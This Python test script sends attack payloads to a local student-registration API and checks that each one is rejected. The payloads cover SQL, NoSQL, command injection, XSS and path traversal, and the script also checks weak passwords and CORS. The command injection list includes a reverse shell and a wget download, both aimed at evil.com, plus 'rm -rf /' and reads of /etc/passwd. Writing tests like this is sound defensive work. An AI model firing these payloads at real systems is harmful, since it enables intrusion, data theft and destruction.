#!/usr/bin/env python3
"""
SECURITY VULNERABILITIES TEST
=============================

This test file specifically targets security vulnerabilities identified in the comprehensive test report.
Category: Security test failures (SQL injection, weak passwords, CORS)

Failed Test Scenarios:
- SQL injection attempts
- Weak password validation
- CORS vulnerabilities
- XSS attempts
"""

import requests
import json
import time
from datetime import datetime
from typing import Dict, List, Optional

class SecurityVulnerabilitiesTest:
    def __init__(self, base_url: str = "http://localhost:8001"):
        self.base_url = base_url
        self.session = requests.Session()
        self.test_results = {"passed": 0, "failed": 0, "errors": []}
    
    def log_test(self, test_name: str, success: bool, details: str = ""):
        status = "✅ PASS" if success else "❌ FAIL"
        print(f"{status} {test_name}")
        if details:
            print(f"   {details}")
        
        if success:
            self.test_results["passed"] += 1
        else:
            self.test_results["failed"] += 1
            self.test_results["errors"].append(f"{test_name}: {details}")

    def test_sql_injection_attempts(self):
        """Test SQL injection attempts that should be blocked"""
        print("\n🔒 TESTING SQL INJECTION ATTEMPTS")
        print("=" * 50)
        
        # Test SQL injection attempts that should be blocked
        sql_injection_attempts = [
            "'; DROP TABLE users; --",
            "' OR '1'='1' --",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES (1, 'hacker', 'hacker@evil.com') --",
            "' OR 1=1; --",
            "'; UPDATE users SET password='hacked' WHERE id=1; --",
            "' OR 'x'='x",
            "admin'--",
            "admin'/*",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for i, injection in enumerate(sql_injection_attempts):
            login_data = {
                "email": injection,
                "password": injection
            }
            
            try:
                response = self.session.post(f"{self.base_url}/api/login", json=login_data)
                if response.status_code == 401:
                    self.log_test(f"SQL Injection Blocked {i+1}", True, f"Correctly blocked: {injection[:20]}...")
                else:
                    self.log_test(f"SQL Injection Blocked {i+1}", False, f"Expected 401, got {response.status_code} for: {injection[:20]}...")
            except Exception as e:
                self.log_test(f"SQL Injection Test {i+1}", False, str(e))

    def test_weak_password_validation(self):
        """Test weak password validation failures identified in the report"""
        print("\n🔑 TESTING WEAK PASSWORD VALIDATION")
        print("=" * 50)
        
        weak_passwords = [
            "aaaaaaaaaa",  # All same character
            "password",     # Common password
            "123456",       # Numeric only
            "qwerty",       # Keyboard pattern
            "abc123",       # Simple pattern
            "password123",  # Common pattern
            "admin",        # Common admin password
            "123456789",    # Sequential numbers
            "111111",       # Repeated numbers
            "test"          # Too short
        ]
        
        timestamp = int(time.time())
        
        for i, password in enumerate(weak_passwords):
            student_data = {
                "name": f"Test Student {timestamp + i}",
                "roll_number": f"23BT{timestamp + i}",
                "email": f"student{timestamp + i}@test.com",
                "password": password
            }
            
            try:
                response = self.session.post(f"{self.base_url}/api/register", json=student_data)
                if response.status_code == 422:
                    self.log_test(f"Weak Password Rejected {i+1}", True, f"Correctly rejected: {password}")
                else:
                    self.log_test(f"Weak Password Rejected {i+1}", False, f"Expected 422, got {response.status_code} for: {password}")
            except Exception as e:
                self.log_test(f"Weak Password Test {i+1}", False, str(e))

    def test_cors_vulnerabilities(self):
        """Test CORS vulnerabilities identified in the report"""
        print("\n🌐 TESTING CORS VULNERABILITIES")
        print("=" * 50)
        
        # Test CORS headers
        try:
            response = self.session.options(f"{self.base_url}/api/health")
            cors_headers = response.headers.get("Access-Control-Allow-Origin", "")
            
            if cors_headers == "*":
                self.log_test("CORS Origin Validation", False, "CORS allows all origins (*)")
            else:
                self.log_test("CORS Origin Validation", True, f"CORS origin: {cors_headers}")
        except Exception as e:
            self.log_test("CORS Test", False, str(e))

    def test_xss_attempts(self):
        """Test XSS attempts that should be blocked"""
        print("\n🛡️ TESTING XSS ATTEMPTS")
        print("=" * 50)
        
        xss_attempts = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "<iframe src=javascript:alert('xss')>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<details open ontoggle=alert('xss')>",
            "<marquee onstart=alert('xss')>"
        ]
        
        timestamp = int(time.time())
        
        for i, xss in enumerate(xss_attempts):
            student_data = {
                "name": f"Test Student {timestamp + i}",
                "roll_number": f"23BT{timestamp + i}",
                "email": f"student{timestamp + i}@test.com",
                "password": "SecurePassword123!"
            }
            
            # Try to inject XSS in name field
            student_data["name"] = xss
            
            try:
                response = self.session.post(f"{self.base_url}/api/register", json=student_data)
                if response.status_code == 422:
                    self.log_test(f"XSS Blocked {i+1}", True, f"Correctly blocked: {xss[:20]}...")
                else:
                    self.log_test(f"XSS Blocked {i+1}", False, f"Expected 422, got {response.status_code} for: {xss[:20]}...")
            except Exception as e:
                self.log_test(f"XSS Test {i+1}", False, str(e))

    def test_no_sql_injection_attempts(self):
        """Test NoSQL injection attempts"""
        print("\n🔒 TESTING NOSQL INJECTION ATTEMPTS")
        print("=" * 50)
        
        nosql_injection_attempts = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$where": "1==1"}',
            '{"$regex": ".*"}',
            '{"$exists": true}',
            '{"$in": ["admin", "user"]}',
            '{"$or": [{"admin": true}]}',
            '{"$and": [{"admin": true}]}',
            '{"$not": {"admin": false}}',
            '{"$nor": [{"admin": false}]}'
        ]
        
        for i, injection in enumerate(nosql_injection_attempts):
            login_data = {
                "email": injection,
                "password": injection
            }
            
            try:
                response = self.session.post(f"{self.base_url}/api/login", json=login_data)
                if response.status_code == 401:
                    self.log_test(f"NoSQL Injection Blocked {i+1}", True, f"Correctly blocked: {injection[:20]}...")
                else:
                    self.log_test(f"NoSQL Injection Blocked {i+1}", False, f"Expected 401, got {response.status_code} for: {injection[:20]}...")
            except Exception as e:
                self.log_test(f"NoSQL Injection Test {i+1}", False, str(e))

    def test_command_injection_attempts(self):
        """Test command injection attempts"""
        print("\n🔒 TESTING COMMAND INJECTION ATTEMPTS")
        print("=" * 50)
        
        command_injection_attempts = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "|| id",
            "; rm -rf /",
            "| wget http://evil.com/malware",
            "&& curl http://evil.com",
            "; nc -l 4444",
            "| bash -i >& /dev/tcp/evil.com/4444 0>&1",
            "; python -c 'import os; os.system(\"id\")'"
        ]
        
        timestamp = int(time.time())
        
        for i, injection in enumerate(command_injection_attempts):
            student_data = {
                "name": f"Test Student {timestamp + i}",
                "roll_number": f"23BT{timestamp + i}",
                "email": f"student{timestamp + i}@test.com",
                "password": "SecurePassword123!"
            }
            
            # Try to inject command in name field
            student_data["name"] = injection
            
            try:
                response = self.session.post(f"{self.base_url}/api/register", json=student_data)
                if response.status_code == 422:
                    self.log_test(f"Command Injection Blocked {i+1}", True, f"Correctly blocked: {injection[:20]}...")
                else:
                    self.log_test(f"Command Injection Blocked {i+1}", False, f"Expected 422, got {response.status_code} for: {injection[:20]}...")
            except Exception as e:
                self.log_test(f"Command Injection Test {i+1}", False, str(e))

    def test_path_traversal_attempts(self):
        """Test path traversal attempts"""
        print("\n🔒 TESTING PATH TRAVERSAL ATTEMPTS")
        print("=" * 50)
        
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam",
            "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
            "..%xff..%xff..%xffetc%xffpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
        ]
        
        for i, traversal in enumerate(path_traversal_attempts):
            try:
                response = self.session.get(f"{self.base_url}/api/files/{traversal}")
                if response.status_code in [400, 403, 404]:
                    self.log_test(f"Path Traversal Blocked {i+1}", True, f"Correctly blocked: {traversal[:20]}...")
                else:
                    self.log_test(f"Path Traversal Blocked {i+1}", False, f"Expected 400/403/404, got {response.status_code} for: {traversal[:20]}...")
            except Exception as e:
                self.log_test(f"Path Traversal Test {i+1}", False, str(e))

    def run_security_tests(self):
        """Run all security vulnerability tests"""
        print("🔒 RUNNING SECURITY VULNERABILITY TESTS")
        print("=" * 60)
        print(f"Target: Security vulnerabilities from comprehensive test report")
        print(f"Base URL: {self.base_url}")
        print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 60)
        
        # Run all security tests
        self.test_sql_injection_attempts()
        self.test_weak_password_validation()
        self.test_cors_vulnerabilities()
        self.test_xss_attempts()
        self.test_no_sql_injection_attempts()
        self.test_command_injection_attempts()
        self.test_path_traversal_attempts()
        
        # Print summary
        print("\n" + "=" * 60)
        print("📊 SECURITY VULNERABILITY TESTS SUMMARY")
        print("=" * 60)
        print(f"Total Tests: {self.test_results['passed'] + self.test_results['failed']}")
        print(f"Passed: {self.test_results['passed']}")
        print(f"Failed: {self.test_results['failed']}")
        print(f"Success Rate: {(self.test_results['passed'] / (self.test_results['passed'] + self.test_results['failed']) * 100):.1f}%")
        
        if self.test_results['errors']:
            print("\n❌ FAILED TESTS:")
            for error in self.test_results['errors']:
                print(f"  - {error}")
        
        return self.test_results

if __name__ == "__main__":
    # Run the security vulnerability tests
    test_suite = SecurityVulnerabilitiesTest()
    results = test_suite.run_security_tests()
    
    # Exit with appropriate code
    exit(0 if results['failed'] == 0 else 1) 